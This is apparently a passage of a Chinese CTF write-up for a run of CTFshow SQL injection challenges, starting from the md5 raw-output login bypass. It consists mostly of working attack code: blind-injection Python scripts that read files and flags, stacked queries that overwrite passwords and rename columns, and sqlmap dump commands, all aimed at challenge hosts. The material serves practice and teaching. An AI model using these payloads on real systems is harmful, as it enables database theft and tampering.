<p><code>md5($_POST['password'],true);</code>老面孔了用户名填写<code>admin</code>密码为<code>ffifdyop</code><br> 具体的原理的话以前写过一篇类似的文章<a href="https://blog.csdn.net/solitudi/article/details/107813286?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160631731619195283021913%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=160631731619195283021913&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_blog_default-1-107813286.pc_v2_rank_blog_default&amp;utm_term=md5%20%20_POST%20%20password%20%20,true&amp;spm=1018.2118.3001.4450">[SQL绕过]md5($str,true)类型绕过----题目来源CTFSHOW—web9</a></p> 
<p>然后抓个包<br> <img src="https://images2.imgbox.com/b6/e7/3uhCMsoJ_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="web188_288"></a>web188</h2> 
<p>首先<br> <code>SELECT * FROM kk where username = 1&lt;1 and password = 0</code><br> 太高雅了为什么这样就可以查到所有数据<br> 这是弱比较：字符串会转为0 ，所以0=0永远成立<br> 可以<a href="https://stackoverflow.com/questions/18883213/why-select-from-table-where-username-0-shows-all-rows-username-column-is-v" rel="nofollow">参考这篇文章，点我</a><br> 所以<code>SELECT * FROM kk where username = 0 and password = 0</code>也可以</p> 
<p>拓展:牛逼<br> <code>SELECT * FROM kk where username = 'aaa' and password = 12</code><br> 查出<code>username=aaa password=12sasad</code><br> 或者<br> <img src="https://images2.imgbox.com/41/a0/ssyEL7fP_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="web189_302"></a>web189</h2> 
<p>稍微解释下首先找到<code>flag{<!-- --></code>位置然后再盲注得到<code>flag</code></p> 
<pre><code class="prism language-python"><span class="token comment"># Author：Y4tacker</span>
<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://3d54cb5b-69e8-4592-85b3-662e3aa01ea5.chall.ctf.show/api/"</span>


<span class="token keyword">def</span> <span class="token function">getFlagIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    head <span class="token operator">=</span> <span class="token number">1</span>
    tail <span class="token operator">=</span> <span class="token number">300</span>
    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">1</span>
        data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">"if(locate('flag{',"</span> <span class="token operator">+</span> <span class="token string">"load_file('/var/www/html/api/index.php'))&gt;{0},0,1)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'1'</span>
        <span class="token punctuation">}</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">"密码错误"</span> <span class="token operator">==</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            tail <span class="token operator">=</span> mid
    <span class="token keyword">return</span> mid


<span class="token keyword">def</span> <span class="token function">getFlag</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
    i <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>
    result <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
        head <span class="token operator">=</span> <span class="token number">32</span>
        tail <span class="token operator">=</span> <span class="token number">127</span>

        i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>
        <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
            mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">1</span>
            data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
                <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">"if(ascii(substr(load_file('/var/www/html/api/index.php'),{0},1))&gt;{1},0,1)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>
                                                                                                               <span class="token builtin">str</span><span class="token punctuation">(</span>
                                                                                                                   mid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'1'</span>
            <span class="token punctuation">}</span>
            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token string">"密码错误"</span> <span class="token operator">==</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
                head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                tail <span class="token operator">=</span> mid
            mid <span class="token operator">+=</span> <span class="token number">1</span>
        <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
            result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">break</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    index <span class="token operator">=</span> getFlagIndex<span class="token punctuation">(</span><span class="token punctuation">)</span>
    getFlag<span class="token punctuation">(</span>index<span class="token punctuation">)</span>

</code></pre> 
<h2><a id="web190_362"></a>web190</h2> 
<pre><code class="prism language-python"><span class="token comment"># @Author:Y4tacker</span>
<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://02e6409f-d1ac-41e0-8355-c7e0cb8ca1d8.chall.ctf.show/api/"</span>

result <span class="token operator">=</span> <span class="token string">""</span>
i <span class="token operator">=</span> <span class="token number">0</span>

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>
    head <span class="token operator">=</span> <span class="token number">32</span>
    tail <span class="token operator">=</span> <span class="token number">127</span>

    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">1</span>
        <span class="token comment"># 查数据库</span>
        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>
        <span class="token comment"># 查字段</span>
        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'"</span>
        <span class="token comment"># 查flag</span>
        payload <span class="token operator">=</span> <span class="token string">"select group_concat(f1ag) from ctfshow_fl0g"</span>
        data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">'username'</span><span class="token punctuation">:</span> f<span class="token string">"admin' and if(ascii(substr(({payload}),{i},1))&gt;{mid},1,2)='1"</span><span class="token punctuation">,</span>
            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'1'</span>
        <span class="token punctuation">}</span>

        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">"密码错误"</span>  <span class="token operator">==</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            tail <span class="token operator">=</span> mid

    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
        result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>


</code></pre> 
<h2><a id="web191_404"></a>web191</h2> 
<pre><code class="prism language-python"><span class="token comment"># @Author:Y4tacker</span>
<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://7d316f9f-0da8-442d-bf6d-c976a20260e8.chall.ctf.show/api/"</span>

result <span class="token operator">=</span> <span class="token string">""</span>
i <span class="token operator">=</span> <span class="token number">0</span>

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>
    head <span class="token operator">=</span> <span class="token number">32</span>
    tail <span class="token operator">=</span> <span class="token number">127</span>

    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">1</span>
        <span class="token comment"># 查数据库</span>
        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>
        <span class="token comment"># 查字段</span>
        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'"</span>
        <span class="token comment"># 查flag</span>
        payload <span class="token operator">=</span> <span class="token string">"select group_concat(f1ag) from ctfshow_fl0g"</span>
        data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">'username'</span><span class="token punctuation">:</span> f<span class="token string">"admin' and if(ord(substr(({payload}),{i},1))&gt;{mid},1,2)='1"</span><span class="token punctuation">,</span>
            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'1'</span>
        <span class="token punctuation">}</span>

        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">"密码错误"</span>  <span class="token operator">==</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token comment"># print(r.text)</span>
            tail <span class="token operator">=</span> mid

    last <span class="token operator">=</span> result

    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
        result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>


</code></pre> 
<h2><a id="web192_449"></a>web192</h2> 
<pre><code class="prism language-python"><span class="token comment"># @Author:Y4tacker</span>
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> string

url <span class="token operator">=</span> <span class="token string">"http://2c0073f7-8662-4a12-a742-f17e1818ed0a.chall.ctf.show/api/"</span>
flagstr<span class="token operator">=</span><span class="token string">" _{}-"</span> <span class="token operator">+</span> string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digits
flag <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>
        payload <span class="token operator">=</span> f<span class="token string">"admin' and if(substr((select group_concat(f1ag) from ctfshow_fl0g),{i},1)regexp('{j}'),1,2)='1"</span>
        data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">'username'</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span>
            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'1'</span>
        <span class="token punctuation">}</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">"密码错误"</span> <span class="token operator">==</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> j
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token string">"}"</span> <span class="token operator">==</span> j<span class="token punctuation">:</span>
                exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
</code></pre> 
<h2><a id="web193_473"></a>web193</h2> 
<pre><code class="prism language-python"><span class="token comment"># @Author:Y4tacker</span>
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> string

url <span class="token operator">=</span> <span class="token string">"http://2c0073f7-8662-4a12-a742-f17e1818ed0a.chall.ctf.show/api/"</span>
flagstr<span class="token operator">=</span><span class="token string">" _{}-"</span> <span class="token operator">+</span> string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digits
flag <span class="token operator">=</span> <span class="token string">''</span>
z <span class="token operator">=</span> <span class="token string">'flag'</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>
        payload <span class="token operator">=</span> f<span class="token string">"admin' and if((select group_concat(f1ag) from ctfshow_fl0g)regexp('{j}'),1,2)='1"</span>
        data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">'username'</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span>
            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'1'</span>
        <span class="token punctuation">}</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">"密码错误"</span> <span class="token operator">==</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> j
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token string">"}"</span> <span class="token operator">==</span> j<span class="token punctuation">:</span>
                exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
</code></pre> 
<h2><a id="web194_498"></a>web194</h2> 
<p>这道题写了两个脚本，写着玩的</p> 
<pre><code class="prism language-python"><span class="token comment"># @Author:Y4tacker</span>
<span class="token keyword">import</span> requests
<span class="token comment"># 应该还可以用instr等函数，LOCATE、POSITION、INSTR、FIND_IN_SET、IN、LIKE</span>
url <span class="token operator">=</span> <span class="token string">"http://dee436de-268a-408e-b66a-88b4c972e5f5.chall.ctf.show/api/"</span>
final <span class="token operator">=</span> <span class="token string">""</span>
stttr <span class="token operator">=</span> <span class="token string">"flag{}-_1234567890qwertyuiopsdhjkzxcvbnm"</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> stttr<span class="token punctuation">:</span>
        final <span class="token operator">+=</span> j
        <span class="token comment"># 查表名-ctfshow_flxg</span>
        <span class="token comment"># payload = f"admin' and if(locate('{final}',(select table_name from information_schema.tables where table_schema=database() limit 0,1))=1,1,2)='1"</span>
        <span class="token comment"># 查字段-f1ag</span>
        <span class="token comment"># payload = f"admin' and if(locate('{final}',(select column_name from information_schema.columns where table_name='ctfshow_flxg' limit 1,1))=1,1,2)='1"</span>
        payload <span class="token operator">=</span> f<span class="token string">"admin' and if(locate('{final}',(select f1ag from ctfshow_flxg limit 0,1))=1,1,2)='1"</span>
        data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">'username'</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span>
            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'1'</span>
        <span class="token punctuation">}</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">"密码错误"</span> <span class="token operator">==</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>final<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            final <span class="token operator">=</span> final<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>

</code></pre> 
<p>第二个</p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> string

url <span class="token operator">=</span> <span class="token string">"http://2c0073f7-8662-4a12-a742-f17e1818ed0a.chall.ctf.show/api/"</span>
flagstr<span class="token operator">=</span><span class="token string">" _{}-"</span> <span class="token operator">+</span> string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digits
flag <span class="token operator">=</span> <span class="token string">''</span>
z <span class="token operator">=</span> <span class="token string">'flag'</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>
        payload <span class="token operator">=</span> f<span class="token string">"admin' and if((select group_concat(f1ag) from ctfshow_fl0g)regexp('{j}'),1,2)='1"</span>
        data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">'username'</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span>
            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'1'</span>
        <span class="token punctuation">}</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">"密码错误"</span> <span class="token operator">==</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> j
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token string">"}"</span> <span class="token operator">==</span> j<span class="token punctuation">:</span>
                exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
</code></pre> 
<h2><a id="web195_550"></a>web195</h2> 
<p>我比较暴力直接把所有的密码都改为111，之后登录就好</p> 
<pre><code class="prism language-python">payload<span class="token operator">=</span><span class="token string">"0x61646d696e;update`ctfshow_user`set`pass`=0x313131;"</span>
<span class="token comment"># 至于为什么非得用十六进制登录，是因为下面这个没有字符串单引号包围</span>
sql <span class="token operator">=</span> <span class="token string">"select pass from ctfshow_user where username = {$username};"</span><span class="token punctuation">;</span>
</code></pre> 
<h2><a id="web196_557"></a>web196</h2> 
<p>如图，我恨啊<br> <img src="https://images2.imgbox.com/88/68/n9Iv78CM_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="web197198_561"></a>web197-198</h2> 
<p>通过把密码列与id互换之后爆破密码</p> 
<pre><code class="prism language-python"><span class="token comment"># @Author:Y4tacker</span>
<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://b126bc7c-2b32-461d-9520-30d5baf7a152.chall.ctf.show/api/"</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'0;alter table ctfshow_user change column `pass` `ppp` varchar(255);alter table ctfshow_user '</span>
                        <span class="token string">'change column `id` `pass` varchar(255);alter table ctfshow_user change column `ppp` `id` '</span>
                        <span class="token string">'varchar(255);'</span><span class="token punctuation">,</span>
            <span class="token string">'password'</span><span class="token punctuation">:</span> f<span class="token string">'{i}'</span>
        <span class="token punctuation">}</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
    data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
        <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'0x61646d696e'</span><span class="token punctuation">,</span>
        <span class="token string">'password'</span><span class="token punctuation">:</span> f<span class="token string">'{i}'</span>
    <span class="token punctuation">}</span>
    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">"登陆成功"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">break</span>


</code></pre> 
<h2><a id="web190200_588"></a>web190-200</h2> 
<pre><code class="prism language-python"><span class="token comment"># @Author:Y4tacker</span>
<span class="token comment"># username=0;show tables;</span>
<span class="token comment"># pass=ctfshow_user</span>
</code></pre> 
<h2><a id="web201_595"></a>web201(因为是第一题所以详细点)</h2> 
<p>简单说下顺序<br> 1.获取当前MySQL中的所有数据库<br> 2.获取当前数据库名字<br> 3.获取数据库下的数据表<br> 4.获取表下的列名<br> 5.导出数据</p> 
<p>开始实战</p> 
<pre><code class="prism language-php">判断注入点
sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token double-quoted-string string">"http://ea6a1109-3603-47d2-b9ae-73892287235d.chall.ctf.show/api/?id=1"</span> <span class="token operator">--</span>referer<span class="token operator">=</span><span class="token double-quoted-string string">"ctf.show"</span>
</code></pre> 
<pre><code class="prism language-php">查数据库
sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token double-quoted-string string">"http://ea6a1109-3603-47d2-b9ae-73892287235d.chall.ctf.show/api/?id=1"</span> <span class="token operator">--</span>referer<span class="token operator">=</span><span class="token double-quoted-string string">"ctf.show"</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/bc/95/I4Cb8OVh_o.png" alt="在这里插入图片描述"></p> 
<pre><code class="prism language-php">查数据表
sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token double-quoted-string string">"http://ea6a1109-3603-47d2-b9ae-73892287235d.chall.ctf.show/api/?id=1"</span> <span class="token operator">--</span>referer<span class="token operator">=</span><span class="token double-quoted-string string">"ctf.show"</span> <span class="token operator">-</span>D <span class="token double-quoted-string string">"ctfshow_web"</span> <span class="token operator">--</span>tables
</code></pre> 
<p><img src="https://images2.imgbox.com/27/dd/LvViNpUu_o.png" alt="在这里插入图片描述"></p> 
<pre><code class="prism language-php">查列
sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token double-quoted-string string">"http://ea6a1109-3603-47d2-b9ae-73892287235d.chall.ctf.show/api/?id=1"</span> <span class="token operator">--</span>referer<span class="token operator">=</span><span class="token double-quoted-string string">"ctf.show"</span> <span class="token operator">-</span>D <span class="token double-quoted-string string">"ctfshow_web"</span> <span class="token operator">-</span>T <span class="token double-quoted-string string">"ctfshow_user"</span> <span class="token operator">--</span>columns
</code></pre> 
<p><img src="https://images2.imgbox.com/7a/1b/GqPqr2b9_o.png" alt="在这里插入图片描述"></p> 
<pre><code class="prism language-python">sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"http://ea6a1109-3603-47d2-b9ae-73892287235d.chall.ctf.show/api/?id=1"</span> <span class="token operator">-</span><span class="token operator">-</span>referer<span class="token operator">=</span><span class="token string">"ctf.show"</span> <span class="token operator">-</span>D <span class="token string">"ctfshow_web"</span> <span class="token operator">-</span>T <span class="token string">"ctfshow_user"</span> <span class="token operator">-</span>C <span class="token string">"pass"</span> <span class="token operator">-</span><span class="token operator">-</span>dump
</code></pre> 
<p><img src="https://images2.imgbox.com/6f/2f/XGPNwkho_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="web202_627"></a>web202</h2> 
<p><img src="https://images2.imgbox.com/9f/27/A5BtPfLq_o.png" alt="在这里插入图片描述"><br> 直接给payload了</p> 
<pre><code class="prism language-php">第一步用<span class="token operator">--</span>data调整参数
sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token double-quoted-string string">"http://e34d77f4-a6bf-4c49-915c-a20f188282d8.chall.ctf.show/api/"</span> <span class="token operator">--</span>referer<span class="token operator">=</span><span class="token double-quoted-string string">"ctf.show"</span> <span class="token operator">--</span>data<span class="token operator">=</span><span class="token double-quoted-string string">"id=1"</span>
第二步
sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token double-quoted-string string">"http://e34d77f4-a6bf-4c49-915c-a20f188282d8.chall.ctf.show/api/"</span> <span class="token operator">--</span>referer<span class="token operator">=</span><span class="token double-quoted-string string">"ctf.show"</span> <span class="token operator">--</span>data<span class="token operator">=</span><span class="token double-quoted-string string">"id=1"</span> <span class="token operator">--</span>dbs
第三步
sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token double-quoted-string string">"http://e34d77f4-a6bf-4c49-915c-a20f188282d8.chall.ctf.show/api/"</span> <span class="token operator">--</span>referer<span class="token operator">=</span><span class="token double-quoted-string string">"ctf.show"</span> <span class="token operator">--</span>data<span class="token operator">=</span><span class="token double-quoted-string string">"id=1"</span> <span class="token operator">-</span>D <span class="token double-quoted-string string">"ctfshow_web"</span> <span class="token operator">--</span>tables
第四步
sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token double-quoted-string string">"http://e34d77f4-a6bf-4c49-915c-a20f188282d8.chall.ctf.show/api/"</span> <span class="token operator">--</span>referer<span class="token operator">=</span><span class="token double-quoted-string string">"ctf.show"</span> <span class="token operator">--</span>data<span class="token operator">=</span><span class="token double-quoted-string string">"id=1"</span> <span class="token operator">-</span>D <span class="token double-quoted-string string">"ctfshow_web"</span> <span class="token operator">-</span>T <span class="token double-quoted-string string">"ctfshow_user"</span> <span class="token operator">--</span>columns
第五步
sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token double-quoted-string string">"http://e34d77f4-a6bf-4c49-915c-a20f188282d8.chall.ctf.show/api/"</span> <span class="token operator">--</span>referer<span class="token operator">=</span><span class="token double-quoted-string string">"ctf.show"</span> <span class="token operator">--</span>data<span class="token operator">=</span><span class="token double-quoted-string string">"id=1"</span> <span class="token operator">-</span>D <span class="token double-quoted-string string">"ctfshow_web"</span> <span class="token operator">-</span>T <span class="token double-quoted-string string">"ctfshow_user"</span> <span class="token operator">-</span>C <span class="token double-quoted-string string">"pass"</span> <span class="token operator">--</span>dump
